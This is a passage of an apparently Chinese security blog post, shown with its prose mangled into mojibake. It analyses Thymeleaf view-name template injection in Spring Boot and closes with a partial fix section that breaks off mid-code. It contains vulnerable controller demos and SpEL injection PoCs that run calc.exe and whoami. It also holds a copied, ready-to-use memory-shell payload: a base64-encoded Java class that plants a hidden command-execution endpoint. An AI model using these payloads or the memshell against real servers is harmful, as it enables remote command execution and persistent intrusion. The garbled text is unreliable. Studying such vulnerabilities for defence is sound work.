title="è§†å›¾æ¸²æŸ“"></a>è§†å›¾æ¸²æŸ“</h2><p>æœ€åå°±æ˜¯è°ƒç”¨ThymeleafViewçš„renderå‡½æ•°è¿›è¡Œè§†å›¾æ¸²æŸ“</p><p><img src="https://cdn.clown2024.cn/image-20241213224451300.png" alt="image-20241213224451300"></p><p>åé¢çš„å…·ä½“æ¸²æŸ“åˆ†ææ¼æ´çš„æ—¶å€™å†è°ƒè¯•</p><h1 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h1><h2 id="templatenameæ¼æ´"><a href="#templatenameæ¼æ´" class="headerlink" title="templatenameæ¼æ´"></a>templatenameæ¼æ´</h2><p>ç»™å‡ºä¸€ä¸ªæ¼æ´ä»£ç çš„demo</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.springbootmemoryshell.contorller.thymeleaf;<br><br><br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.GetMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestParam;<br><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VulnController</span> &#123;<br>    <span class="hljs-meta">@GetMapping(&quot;/path&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">path</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String lang)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;user/&quot;</span> + lang + <span class="hljs-string">&quot;/welcome&quot;</span>; <span class="hljs-comment">//template path is tainted</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™ç§æƒ…å†µæ˜¯ç›´æ¥å°†å‚æ•°æ‹¼æ¥åˆ°äº†æ¨¡æ¿è·¯å¾„ä¸­</p><p><strong>poc</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22calc.exe%22).getInputStream()).next()%7d__::.x<br></code></pre></td></tr></table></figure><blockquote><p>è¿™é‡Œå³ä½¿ä¸åŠ <code>.x</code>ä¾ç„¶å¯ä»¥è§¦å‘å‘½ä»¤æ‰§è¡Œ</p></blockquote><p>ä¸€å¼€å§‹æˆ‘ç”¨çš„thymeleaf2.5.10ç‰ˆæœ¬æ‰“è¿™ä¸ªpayloadç»™æˆ‘æŠ¥äº†ä¸‹é¢çš„é”™è¯¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">View name contains an expression and so does either the URL path or one of the request parameters. This is forbidden in order to reduce the possibilities that direct user input is executed as a part of the view name.<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªé”™è¯¯ä¿¡æ¯è¡¨æ˜åœ¨å¤„ç† Thymeleaf æ¨¡æ¿æ—¶ï¼Œè§†å›¾åç§°åŒ…å«äº†ä¸€ä¸ªè¡¨è¾¾å¼ï¼Œå¹¶ä¸” URL è·¯å¾„æˆ–è¯·æ±‚å‚æ•°ä¸­ä¹ŸåŒ…å«äº†ä¸€ä¸ªè¡¨è¾¾å¼ã€‚è¿™ç§æƒ…å†µä¸‹ï¼ŒThymeleaf ä¸ºäº†é˜²æ­¢ç”¨æˆ·è¾“å…¥ç›´æ¥è¢«æ‰§è¡Œä¸ºè§†å›¾åç§°çš„ä¸€éƒ¨åˆ†ï¼Œç¦æ­¢äº†è¿™ç§æƒ…å†µã€‚</p><p>é‚£è¯´æ˜åé¢ç‰ˆæœ¬çš„ä¿®å¤æ˜¯é‡‡ç”¨äº†ç¦æ­¢è¡¨è¾¾å¼çš„æ–¹å¼ï¼Œç„¶åçœ‹äº†ä¸€ä¸‹å…·ä½“çš„æŠ¥é”™ç‰ˆæœ¬</p><p><img src="https://cdn.clown2024.cn/image-20241213230550190.png" alt="image-20241213230550190"></p><p>æ˜¯thymeleaf-spring5-3.0.15.RELEASE.jarè¿™ä¸ªç‰ˆæœ¬çš„jaråŒ…ä¿®å¤äº†ï¼Œéœ€è¦å°†spring-boot-starter-parentçš„ç‰ˆæœ¬é™ä¸€ä¸‹ï¼Œé™æˆ2.4.1å°±è¡Œäº†ï¼Œç„¶åè¿™æ—¶å€™thymeleaf-springçš„ç‰ˆæœ¬æ˜¯3.0.11çš„ç‰ˆæœ¬</p><p><img src="https://cdn.clown2024.cn/image-20241213230754543.png" alt="image-20241213230754543"></p><h3 id="æµç¨‹åˆ†æ"><a href="#æµç¨‹åˆ†æ" class="headerlink" title="æµç¨‹åˆ†æ"></a>æµç¨‹åˆ†æ</h3><p>å…³é”®åœ¨å‰é¢æˆ‘ä»¬æ²¡åˆ†æçš„renderFragmentå‡½æ•°çš„æ¸²æŸ“è¿‡ç¨‹é‡Œé¢</p><p><img src="https://cdn.clown2024.cn/image-20241213231629083.png" alt="image-20241213231629083"></p><p>é¦–å…ˆå¦‚ä¸Šå›¾ï¼Œæˆ‘ä»¬å¾—viewTemplateNameç»è¿‡æ‹¼æ¥ä¹‹åçš„å€¼ç°åœ¨æ˜¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">user/__$&#123;new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;calc.exe&quot;).getInputStream()).next()&#125;__::/welcome<br></code></pre></td></tr></table></figure><p>ç„¶åä»–ä¼šåˆ¤æ–­é‡Œé¢æ˜¯å¦æœ‰::å­—ç¬¦ä¸²ï¼Œè¿™ä»£è¡¨å…¶æ˜¯ä¸€ä¸ªç‰‡æ®µè¡¨è¾¾å¼</p><p>ç„¶åç»§ç»­å¾€ä¸‹</p><p><img src="https://cdn.clown2024.cn/image-20241213231941833.png" alt="image-20241213231941833"></p><p>ä¼šè·å–ä¸€ä¸ªè¡¨è¾¾å¼è§£æå™¨ï¼Œç„¶åè§£æè¡¨è¾¾å¼ï¼Œä¸”å°†æˆ‘ä»¬çš„viewTemplateNameç”¨~{å’Œ}åŒ…è£¹èµ·æ¥</p><p>ç„¶åè§¦å‘çš„è¿‡ç¨‹å°±åœ¨parseExpressionæ–¹æ³•é‡Œé¢ï¼Œä¸€ç›´å¾€åèµ°ä¼šèµ°åˆ°StandardExpressionPreprocessor#preprocessæ–¹æ³•å†…</p><p><img src="https://cdn.clown2024.cn/image-20241213233227916.png" alt="image-20241213233227916"></p><p>è¿™é‡Œæœ‰ä¸€ä¸ªæ­£åˆ™æå–å†…å®¹çš„åŒ¹é…å™¨</p><p><img src="https://cdn.clown2024.cn/image-20241213233851249.png" alt="image-20241213233851249"></p><p>å…¶æ­£åˆ™åŒ¹é…æ ¼å¼å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">\_\_(.*?)\_\_<br></code></pre></td></tr></table></figure><p>ä»£è¡¨å…¶åŒ¹é…__â€¦__ä¹‹é—´çš„å†…å®¹ï¼Œä¹Ÿå°±æ˜¯å¯ä»¥å°†æˆ‘ä»¬é‡Œé¢çš„è¡¨è¾¾å¼å†…å®¹åˆ†å‰²å‡ºæ¥äº†ï¼Œç»§ç»­å¾€ä¸‹çœ‹</p><p><img src="https://cdn.clown2024.cn/image-20241213234249011.png" alt="image-20241213234249011"></p><p>æœ€ç»ˆæ˜¯å°†æˆ‘ä»¬çš„è¡¨è¾¾å¼åˆ†å‰²å‡ºæ¥ï¼Œè·å¾—äº†ä¸€ä¸ªVariableExpressionï¼Œç„¶åæ‰§è¡Œå…¶executeå‡½æ•°æ‰§è¡Œè¡¨è¾¾å¼</p><p>ç„¶åå±‚å±‚è°ƒç”¨æœ€ç»ˆé€šè¿‡SPELæ¥æ‰§è¡Œè¡¨è¾¾å¼å†…å®¹</p><p><img src="https://cdn.clown2024.cn/image-20241213234528330.png" alt="image-20241213234528330"></p><p>æ‰€ä»¥è¯¥æ¼æ´å®é™…ä¸Šå°±æ˜¯SPELè¡¨è¾¾å¼æ‰§è¡Œ</p><p>æ‰€ä»¥æ ¹æ®å‰é¢çš„åˆ†ææˆ‘ä»¬å¯ä»¥çŸ¥é“å¯ä»¥ä¸éœ€è¦.xï¼Œä½†æ˜¯ä¸‹é¢çš„æ¼æ´å½¢å¼ä¸€å®šéœ€è¦.x</p><h2 id="uri-path"><a href="#URI-PATH" class="headerlink" title="URI PATH"></a>URI PATH</h2><p>æ¼æ´ä»£ç </p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/doc/&#123;document&#125;&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">getDocument</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> String document)</span> &#123;<br>    log.info(<span class="hljs-string">&quot;Retrieving &quot;</span> + document);<br>    <span class="hljs-comment">//returns void, so view name is taken from URI</span><br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæ¼æ´åŸç†æ€»ç»“èµ·æ¥å°±æ˜¯å› ä¸ºModelAndViewè¿”å›å€¼ä¸ºç©ºï¼Œæ‰€ä»¥viewTemplateNameä¼šä»uriä¸­è·å–ï¼Œç›´æ¥åœ¨<code>&#123;document&#125;</code>ä½ç½®ä¼ å…¥payloadå³å¯</p><p>poc</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">http://localhost:8081/doc/lang=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22calc.exe%22).getInputStream()).next()%7d__::.x<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241213235751753.png" alt="image-20241213235751753"></p><h3 id="æµç¨‹åˆ†æ"><a href="#æµç¨‹åˆ†æ-1" class="headerlink" title="æµç¨‹åˆ†æ"></a>æµç¨‹åˆ†æ</h3><p>æ¥å…·ä½“çœ‹ä¸€ä¸‹ä¸ºä»€ä¹ˆæ²¡æœ‰è¿”å›ä¹Ÿä¼šèµ‹å€¼çš„åŸå› ï¼ŒåŸå› ä¸»è¦åœ¨<code>DispatcherServlet#doDispatch</code>ä¸­ï¼Œè·å–<code>ModleAndView</code>åè¿˜ä¼šæ‰§è¡Œ<code>applyDefaultViewName</code>æ–¹æ³•ã€‚</p><p><img src="https://cdn.clown2024.cn/image-20241214000125870.png" alt="image-20241214000125870"></p><p>å¯ä»¥çœ‹åˆ°æ­¤æ—¶çš„mvé‡Œé¢éƒ½ä¸ºç©ºï¼Œç„¶åä¼šæ‰§è¡Œä¸€ä¸ªapplyDefaultViewNameæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241214000313196.png" alt="image-20241214000313196"></p><p>é‡Œé¢ä¼šä»requestå¯¹è±¡é‡Œé¢è·å–ä¸€ä¸ªé»˜è®¤çš„ViewNameï¼Œè·å–åˆ°çš„defaultViewNameå°±æ˜¯æˆ‘ä»¬çš„è·¯å¾„</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">doc/lang=__$&#123;new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;calc.exe&quot;).getInputStream()).next()&#125;__::<br></code></pre></td></tr></table></figure><p>ç„¶åå°±æŠŠviewnameè®¾ç½®ä¸ºäº†æˆ‘ä»¬é»˜è®¤çš„è¿™ä¸ªViewName</p><p>æ¬¸ç„¶åè¿™é‡Œå‘ç°ï¼Œgetå›æ¥çš„ViewNameå·²ç»æŠŠæˆ‘ä»¬çš„.xå»æ‰äº†ï¼Œè¿™æ˜¯æ€ä¹ˆå›äº‹å‘¢ï¼Œè¿›å»å…·ä½“çœ‹çœ‹éƒ½å‘ç”Ÿäº†ä»€ä¹ˆ</p><p>å…·ä½“æ˜¯é‡Œé¢çš„ä¸€ä¸ªtransformPathå‡½æ•°ï¼Œå¯¹è·¯ç”±è¿›è¡Œäº†æ ¼å¼è½¬åŒ–</p><p><img src="https://cdn.clown2024.cn/image-20241214001608987.png" alt="image-20241214001608987"></p><p>é¦–å…ˆå‰é¢ä¸¤éƒ¨åˆ†æ˜¯å»æ‰äº†å‰åçš„&#x2F;ï¼Œç„¶åè°ƒç”¨StringUtils.stripFilenameExtensionæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241214001912868.png" alt="image-20241214001912868"></p><p>é‡Œé¢åˆ†åˆ«è·å–äº†æœ€åä¸€ä¸ª.çš„ç´¢å¼•å’Œæœ€åä¸€ä¸ª&#x2F;çš„ç´¢å¼•ï¼Œç„¶åæˆªå–åˆ°æœ€åä¸€ä¸ª.ç´¢å¼•çš„å†…å®¹</p><p>åˆ°è¿™é‡Œå°±æ˜ç™½æˆ‘ä»¬æœ€åä¸ºä»€ä¹ˆè¦åŠ ä¸€ä¸ª.xäº†å§ï¼Œå› ä¸ºéœ€è¦ä¿è¯æˆ‘ä»¬å‰é¢çš„payloadæ˜¯å®Œæ•´çš„ï¼Œæ‰€ä»¥å¾—åœ¨æœ€ååŠ ä¸€ä¸ª.ï¼Œå…¶å®ç»è¿‡åˆ†æåœ¨æœ€ååŠ ä¸ª.å°±å¯ä»¥äº†ï¼Œä¸ç”¨.x</p><p>åé¢çš„æµç¨‹å°±å’Œå‰é¢ä¸€æ ·äº†ï¼Œå°±ä¸åˆ†æäº†</p><blockquote><p>æ³¨æ„è¿™ä¸ªåªé€‚åˆæ— è¿”å›å€¼çš„æ—¶å€™ï¼Œä¸ç„¶viewå°±ä¼šè¢«è¿”å›å€¼ç»™å äº†</p></blockquote><h2 id="å›æ˜¾é—®é¢˜"><a href="#å›æ˜¾é—®é¢˜" class="headerlink" title="å›æ˜¾é—®é¢˜"></a>å›æ˜¾é—®é¢˜</h2><p>çœ‹æ–‡ç« ä»–ä»¬çš„å›æ˜¾å†…å®¹æ˜¾ç¤ºåœ¨äº†å‰ç«¯çš„æŠ¥é”™ä¿¡æ¯å†…éƒ¨ï¼Œåƒè¿™æ ·</p><p><img src="https://cdn.clown2024.cn/image-20241214003633723.png" alt="image-20241214003633723"></p><p>è€Œæˆ‘çš„æ²¡æœ‰ï¼Œä»–åœ¨åå°çš„æ§åˆ¶å°çš„æŠ¥é”™å†…å®¹å€’æ˜¯æœ‰æ²¡ç»·ä½</p><p><img src="https://cdn.clown2024.cn/image-20241214003725080.png" alt="image-20241214003725080"></p><p>ç„¶åæœ‰å›æ˜¾çš„pocéœ€è¦::åé¢æ˜¯æœ‰å†…å®¹çš„ï¼Œå¤§è‡´åŸå› ä¸»è¦æ˜¯åœ¨<code>StandardExpressionParser#parseExpression</code>,åœ¨<code>preprocess</code>é¢„å¤„ç†ç»“æŸåè¿˜ä¼šé€šè¿‡<code>Expression.parse</code>è¿›è¡Œä¸€æ¬¡è§£æï¼Œè¿™é‡Œå¦‚æœè§£æå¤±è´¥åˆ™ä¸ä¼šå›æ˜¾ï¼Œè¿™é‡Œå°±ä¸åˆ†æäº†</p><p>pocåœ¨::åé¢éšä¾¿åŠ ç‚¹å†…å®¹å°±å¯ä»¥äº†</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">http://localhost:8081/doc/=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22whoami%22).getInputStream()).next()%7d__::aa.<br></code></pre></td></tr></table></figure><p>è‡³äºæˆ‘å‰æ®µä¸ºä»€ä¹ˆæ²¡å›æ˜¾æˆ‘å°±ä¸æƒ³çº ç»“äº†ï¼Œä¸å¦‚ç›´æ¥æ‰“å†…å­˜é©¬æ¥çš„æ–¹ä¾¿ï¼Œæœ‰å…³spelè¡¨è¾¾å¼æ³¨å…¥çš„å­¦ä¹ æ”¾ä¸‹ä¸€ç¯‡æ–‡ç« äº†ã€‚</p><h2 id="æ³¨å…¥å†…å­˜é©¬"><a href="#æ³¨å…¥å†…å­˜é©¬" class="headerlink" title="æ³¨å…¥å†…å­˜é©¬"></a>æ³¨å…¥å†…å­˜é©¬</h2><p>è¿™é‡Œç›´æ¥copyæ–‡ç« çš„ä¸€ä¸ªå†…å­˜é©¬payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">http://localhost:8081/doc/__$&#123;T (org.springframework.cglib.core.ReflectUtils).defineClass(&quot;SpringRequestMappingMemshell&quot;,T (org.springframework.util.Base64Utils).decodeFromUrlSafeString(&quot;yv66vgAAADQAoQoACQBRCABSCgBTAFQIAFUKAFMAVgoACQBXCAAzBwBYBwBZBwBaCgAIAFsKAAoAXAcAXQgANQcAXgoACABfBwBgCABhCgARAGIHAGMHAGQKABQAZQcAZgoAFwBnCgANAFEKAAoAaAgAaQcAagoAHABrCABsCQBtAG4KAG8AcAcAcQoAcgBzCgAhAHQIAHUKACEAdgoAIQB3BwB4CQB5AHoKACcAewEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAeTFNwcmluZ1JlcXVlc3RNYXBwaW5nTWVtc2hlbGw7AQAIZG9JbmplY3QBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvU3RyaW5nOwEAD3JlZ2lzdGVyTWFwcGluZwEAGkxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAOZXhlY3V0ZUNvbW1hbmQBABhwYXR0ZXJuc1JlcXVlc3RDb25kaXRpb24BAEhMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL1BhdHRlcm5zUmVxdWVzdENvbmRpdGlvbjsBABdtZXRob2RzUmVxdWVzdENvbmRpdGlvbgEATkxvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUmVxdWVzdE1ldGhvZHNSZXF1ZXN0Q29uZGl0aW9uOwEAEnJlcXVlc3RNYXBwaW5nSW5mbwEAP0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvUmVxdWVzdE1hcHBpbmdJbmZvOwEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBABxyZXF1ZXN0TWFwcGluZ0hhbmRsZXJNYXBwaW5nAQASTGphdmEvbGFuZy9PYmplY3Q7AQADbXNnAQASTGphdmEvbGFuZy9TdHJpbmc7AQANU3RhY2tNYXBUYWJsZQcAWQcAXgcAagEAEE1ldGhvZFBhcmFtZXRlcnMBAD0oTGphdmEvbGFuZy9TdHJpbmc7KUxvcmcvc3ByaW5nZnJhbWV3b3JrL2h0dHAvUmVzcG9uc2VFbnRpdHk7AQADY21kAQAKZXhlY1Jlc3VsdAEACkV4Y2VwdGlvbnMHAHwBACJSdW50aW1lVmlzaWJsZVBhcmFtZXRlckFubm90YXRpb25zAQA2TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2JpbmQvYW5ub3RhdGlvbi9SZXF1ZXN0UGFyYW07AQAFdmFsdWUBAApTb3VyY2VGaWxlAQAhU3ByaW5nUmVxdWVzdE1hcHBpbmdNZW1zaGVsbC5qYXZhDAAqACsBAAxpbmplY3Qtc3RhcnQHAH0MAH4AfwEACGNhbGMuZXhlDACAAIEMAIIAgwEAD2phdmEvbGFuZy9DbGFzcwEAEGphdmEvbGFuZy9PYmplY3QBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QMAIQAhQwAhgCHAQAcU3ByaW5nUmVxdWVzdE1hcHBpbmdNZW1zaGVsbAEAEGphdmEvbGFuZy9TdHJpbmcMAIgAhQEARm9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9QYXR0ZXJuc1JlcXVlc3RDb25kaXRpb24BAAIvKgwAKgCJAQBMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL1JlcXVlc3RNZXRob2RzUmVxdWVzdENvbmRpdGlvbgEANW9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2JpbmQvYW5ub3RhdGlvbi9SZXF1ZXN0TWV0aG9kDAAqAIoBAD1vcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvUmVxdWVzdE1hcHBpbmdJbmZvDAAqAIsMAIwAjQEADmluamVjdC1zdWNjZXNzAQATamF2YS9sYW5nL0V4Y2VwdGlvbgwAjgArAQAMaW5qZWN0LWVycm9yBwCPDACQAJEHAJIMAJMAlAEAEWphdmEvdXRpbC9TY2FubmVyBwCVDACWAJcMACoAmAEAAlxBDACZAJoMAJsAnAEAJ29yZy9zcHJpbmdmcmFtZXdvcmsvaHR0cC9SZXNwb25zZUVudGl0eQcAnQwAngCfDAAqAKABABNqYXZhL2lvL0lPRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEACWdldE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEAEWdldERlY2xhcmVkTWV0aG9kAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEAOyhbTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2JpbmQvYW5ub3RhdGlvbi9SZXF1ZXN0TWV0aG9kOylWAQH2KExvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUGF0dGVybnNSZXF1ZXN0Q29uZGl0aW9uO0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUmVxdWVzdE1ldGhvZHNSZXF1ZXN0Q29uZGl0aW9uO0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUGFyYW1zUmVxdWVzdENvbmRpdGlvbjtMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL0hlYWRlcnNSZXF1ZXN0Q29uZGl0aW9uO0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vQ29uc3VtZXNSZXF1ZXN0Q29uZGl0aW9uO0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUHJvZHVjZXNSZXF1ZXN0Q29uZGl0aW9uO0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUmVxdWVzdENvbmRpdGlvbjspVgEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAD3ByaW50U3RhY2tUcmFjZQEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAFcHJpbnQBABUoTGphdmEvbGFuZy9PYmplY3Q7KVYBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAARuZXh0AQAUKClMamF2YS9sYW5nL1N0cmluZzsBACNvcmcvc3ByaW5nZnJhbWV3b3JrL2h0dHAvSHR0cFN0YXR1cwEAAk9LAQAlTG9yZy9zcHJpbmdmcmFtZXdvcmsvaHR0cC9IdHRwU3RhdHVzOwEAOihMamF2YS9sYW5nL09iamVjdDtMb3JnL3NwcmluZ2ZyYW1ld29yay9odHRwL0h0dHBTdGF0dXM7KVYAIQANAAkAAAAAAAMAAQAqACsAAQAsAAAALwABAAEAAAAFKrcAAbEAAAACAC0AAAAGAAEAAAAMAC4AAAAMAAEAAAAFAC8AMAAAAAkAMQAyAAIALAAAAXEACQAHAAAApBICTLgAAxIEtgAFVyq2AAYSBwa9AAhZAxIJU1kEEglTWQUSClO2AAtNLAS2AAwSDRIOBL0ACFkDEg9TtgAQTrsAEVkEvQAPWQMSElO3ABM6BLsAFFkDvQAVtwAWOgW7ABdZGQQZBQEBAQEBtwAYOgYsKga9AAlZAxkGU1kEuwANWbcAGVNZBS1TtgAaVxIbTKcAEk0stgAdEh5MsgAfLLYAICuwAAEAAwCQAJMAHAADAC0AAABCABAAAAAOAAMAEAAMABEAKQASAC4AEwA_ABQAUQAVAF4AFgBwABcAjQAYAJAAHQCTABkAlAAaAJgAGwCbABwAogAeAC4AAABSAAgAKQBnADMANAACAD8AUQA1ADQAAwBRAD8ANgA3AAQAXgAyADgAOQAFAHAAIAA6ADsABgCUAA4APAA9AAIAAACkAD4APwAAAAMAoQBAAEEAAQBCAAAAEwAC_wCTAAIHAEMHAEQAAQcARQ4ARgAAAAUBAD4AAAABADUARwAEACwAAABoAAQAAwAAACa7ACFZuAADK7YABbYAIrcAIxIktgAltgAmTbsAJ1kssgAotwApsAAAAAIALQAAAAoAAgAAACMAGgAkAC4AAAAgAAMAAAAmAC8AMAAAAAAAJgBIAEEAAQAaAAwASQBBAAIASgAAAAQAAQBLAEYAAAAFAQBIAAAATAAAAAwBAAEATQABAE5zAEgAAQBPAAAAAgBQ&quot;),nEw javax.management.loading.MLet(NeW java.net.URL(&quot;http&quot;,&quot;127.0.0.1&quot;,&quot;1.txt&quot;),T (java.lang.Thread).currentThread().getContextClassLoader())).doInject(T (org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;,0).getBean(T (Class).forName(&quot;org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping&quot;)))&#125;__::main.x<br></code></pre></td></tr></table></figure><p>ç„¶åè®¿é—® <code>/asd?cmd=whoami</code> ã€‚</p><h2 id="å…¶ä»–å§¿åŠ¿"><a href="#å…¶ä»–å§¿åŠ¿" class="headerlink" title="å…¶ä»–å§¿åŠ¿"></a>å…¶ä»–å§¿åŠ¿</h2><p>${â€¦}æ”¹æˆ*{â€¦}ä¹Ÿæ˜¯å¯ä»¥çš„</p><p><strong>çœç•¥__</strong></p><p>å½“Controllerå¦‚ä¸‹é…ç½®æ—¶ï¼Œå¯ä»¥çœç•¥<code>__</code>åŒ…è£¹ï¼Œå› ä¸ºæˆ‘ä»¬ä¸éœ€è¦ç‰¹æ„å»åˆ†å‰²å­—ç¬¦ä¸²äº†</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/path&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">path2</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String lang)</span> &#123;<br>    <span class="hljs-keyword">return</span> lang; <span class="hljs-comment">//template path is tainted</span><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="ä¿®å¤"><a href="#ä¿®å¤" class="headerlink" title="ä¿®å¤"></a>ä¿®å¤</h1><ol><li><p>é…ç½® <code>@ResponseBody</code> æˆ–è€… <code>@RestController</code>ï¼Œè¿™ä¸¤ä¸ªæ³¨è§£ä¸€å¼€å§‹ä¹Ÿæåˆ°è¿‡ï¼Œä»–ä»¬ä¼šå°†è¿”å›å€¼ä¼šè‡ªåŠ¨ä½œä¸ºHTTPå“åº”çš„æ­£æ–‡è¿”å›ï¼Œè¿™æ„å‘³ç€è¿”å›å€¼ä¸ä¼šè¢«è§†å›¾è§£æå™¨å¤„ç†ï¼Œè€Œæ˜¯ç›´æ¥å†™å…¥HTTPå“åº”ä½“ä¸­ã€‚</p></li><li><p>åœ¨è¿”å›å€¼å‰é¢åŠ ä¸Š â€œredirect:â€</p><p>è¿™æ ·ä¸å†ç”± Spring ThymeleafViewæ¥è¿›è¡Œè§£æï¼Œè€Œæ˜¯ç”± RedirectView æ¥è¿›è¡Œè§£æã€‚</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/safe/redirect&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">redirect</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String url)</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;redirect:&quot;</span> + url; <span class="hljs-comment">//FP as redirects are not resolved as expressions</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>åœ¨æ–¹æ³•å‚æ•°ä¸­åŠ ä¸Š HttpServletResponse å‚æ•°</p><p>ç”±äºcontrollerçš„å‚æ•°è¢«è®¾ç½®ä¸ºHttpServletResponseï¼ŒSpringè®¤ä¸ºå®ƒå·²ç»å¤„ç†äº†HTTP Responseï¼Œå› æ­¤ä¸ä¼šå‘ç”Ÿè§†å›¾åç§°è§£æã€‚</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/safe/doc/&#123;document&#125;&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title 